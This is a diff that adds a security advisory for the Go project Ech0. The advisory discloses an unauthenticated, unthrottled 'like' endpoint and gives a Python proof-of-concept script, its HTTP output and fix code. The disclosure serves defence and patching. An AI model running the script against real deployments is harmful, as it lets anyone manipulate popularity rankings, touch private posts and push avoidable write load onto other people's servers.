@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-pj6q-4vq4-r8cg",
+  "modified": "2026-05-07T21:33:48.960779Z",
+  "published": "2026-05-07T21:23:57Z",
+  "summary": "Ech0 allows PUT /api/echo/like/:id unauthenticated: anonymous callers to modify any echo's fav_count",
+  "details": "## Summary\n\n`PUT /api/echo/like/:id` at `internal/router/echo.go:12` is registered on `PublicRouterGroup` with no authentication and no rate limit. Anonymous callers increment the `fav_count` counter on any echo (including private echoes) by UUID, repeat the request without deduplication, and trigger a database write plus a four-key cache invalidation on every call. Alice harvests echo UUIDs from the public `GET /api/echo/page` response, inflates fav counts at will, and spams writes to amplify load on the DB and cache layers.\n\n## Details\n\nRoute registration at `internal/router/echo.go:12`:\n\n```go\nappRouterGroup.PublicRouterGroup.PUT(\"/echo/like/:id\", h.EchoHandler.LikeEcho())\n```\n\n`PublicRouterGroup` is `r.Group(\"/api\")` without the JWT middleware that `AuthRouterGroup` applies. The handler passes through to `EchoService.LikeEcho`, which calls `EchoRepository.LikeEcho` at `internal/repository/echo/echo.go:270`:\n\n```go\nfunc (echoRepository *EchoRepository) LikeEcho(ctx context.Context, id string) error {\n    var exists bool\n    if err := echoRepository.getDB(ctx).Model(\u0026model.Echo{}).\n        Select(\"count(*) \u003e 0\").Where(\"id = ?\", id).Find(\u0026exists).Error; err != nil {\n        return err\n    }\n    if !exists {\n        return errors.New(commonModel.ECHO_NOT_FOUND)\n    }\n    if err := echoRepository.getDB(ctx).Model(\u0026model.Echo{}).\n        Where(\"id = ?\", id).\n        UpdateColumn(\"fav_count\", gorm.Expr(\"fav_count + ?\", 1)).Error; err != nil {\n        return err\n    }\n    return nil\n}\n```\n\nNo viewer check, no ownership check, no private-flag check. Compare the read path at `EchoService.GetEchoById` (`internal/service/echo/echo.go:275-300`) which rejects anonymous readers on private echoes; the like path skips that gate. `InvalidateEchoCaches` (`internal/repository/echo/echo.go:51-58`) clears the page cache, today cache, RSS cache, and per-echo cache on every like. Comment creation on the same router group runs behind `checkRateLimit` (`internal/service/comment/comment.go:731-766`, 3 per 60 s per IP plus 20 per 3600 s); the like endpoint has no such middleware.\n\n## Proof of Concept\n\nDefault install, anonymous caller on the network:\n\n```python\nimport requests\nTARGET = \"http://localhost:8300\"\n\n# 1) Discover an echo UUID from the public feed (no auth).\npage = requests.get(f\"{TARGET}/api/echo/page?page=1\u0026pageSize=1\").json()\necho_id = page[\"data\"][\"items\"][0][\"id\"]\n\n# 2) Like it. Repeat without deduplication.\nfor i in range(3):\n    r = requests.put(f\"{TARGET}/api/echo/like/{echo_id}\")\n    print(f\"public like #{i+1}: HTTP {r.status_code} {r.text}\")\n\n# 3) Like a private echo by UUID. Private echoes never appear in /api/echo/page,\n#    but the UUID arrives via other channels (logs, referer, shared drafts).\nprivate_id = \"019daf77-4a97-7c4c-a63c-791b10ecfd0b\"  # admin-created private echo\nr = requests.put(f\"{TARGET}/api/echo/like/{private_id}\")\nprint(f\"private like: HTTP {r.status_code} {r.text}\")\n```\n\nObserved on v4.5.6 in the test container:\n\n```\npublic like #1: HTTP 200 {\"code\":1,\"msg\":\"点赞Echo成功\",\"data\":null}\npublic like #2: HTTP 200 {\"code\":1,\"msg\":\"点赞Echo成功\",\"data\":null}\npublic like #3: HTTP 200 {\"code\":1,\"msg\":\"点赞Echo成功\",\"data\":null}\nprivate like: HTTP 200 {\"code\":1,\"msg\":\"点赞Echo成功\",\"data\":null}\n```\n\nThe same IP likes the same echo three times without 429 or dedup. The private-echo like (UUID `019daf77-4a97...`) succeeded even though `GetEchosById` would refuse to read that echo for an anonymous caller.\n\n## Impact\n\nAnonymous, rate-limit-free writes against any echo's `fav_count`. Direct impact:\n\n- **Popularity signal destruction.** fav_count powers the `hot` feed; a single script skews the ranking at will.\n- **Private-boundary bypass.** Private-flagged echoes remain non-readable, but they accept likes from anyone who knows the UUID. UUIDs leak through logs, referer headers on shared drafts, and the owner's browser history.\n- **Server and cache load.** Every call triggers a SQLite `UPDATE` transaction plus four cache-key invalidations. A single attacker from one IP drives sustained writes and forces cache stampedes for every concurrent reader.\n\nReachability is anonymous. No credentials, no tokens, no session. Every Ech0 deployment that exposes port 6277 is reachable.\n\n## Recommended Fix\n\nMove the route to `AuthRouterGroup` so JWT middleware applies, add a per-user dedup gate, and rate-limit at the middleware layer:\n\n```go\nappRouterGroup.AuthRouterGroup.PUT(\n    \"/echo/like/:id\",\n    middleware.RateLimit(5, 10),\n    h.EchoHandler.LikeEcho(),\n)\n```\n\nAt the service layer, check the private flag and record the user/echo pair in a join table to prevent repeat increments from the same user:\n\n```go\nfunc (s *EchoService) LikeEcho(ctx context.Context, id string) error {\n    userID := viewer.MustFromContext(ctx).UserID()\n    if userID == \"\" {\n        return errors.New(commonModel.NO_PERMISSION_DENIED)\n    }\n    echo, err := s.echoRepository.GetEchosById(ctx, id)\n    if err != nil || echo == nil {\n        return errors.New(commonModel.ECHO_NOT_FOUND)\n    }\n    if echo.Private {\n        user, err := s.commonService.CommonGetUserByUserId(ctx, userID)\n        if err != nil || !user.IsAdmin {\n            return errors.New(commonModel.NO_PERMISSION_DENIED)\n        }\n    }\n    return s.echoRepository.LikeEchoOnce(ctx, id, userID)\n}\n```\n\n---\n*Found by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/lin-snow/Ech0",
+        "purl": "pkg:golang/github.com/lin-snow/Ech0"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.8-0.20260503035905-cecc2c19b590"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-pj6q-4vq4-r8cg/GHSA-pj6q-4vq4-r8cg.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/security/advisories/GHSA-pj6q-4vq4-r8cg"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/lin-snow/Ech0/commit/cecc2c19b590df85d79ea98457faa143130cd620"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lin-snow/Ech0"
+    }
+  ]
+}
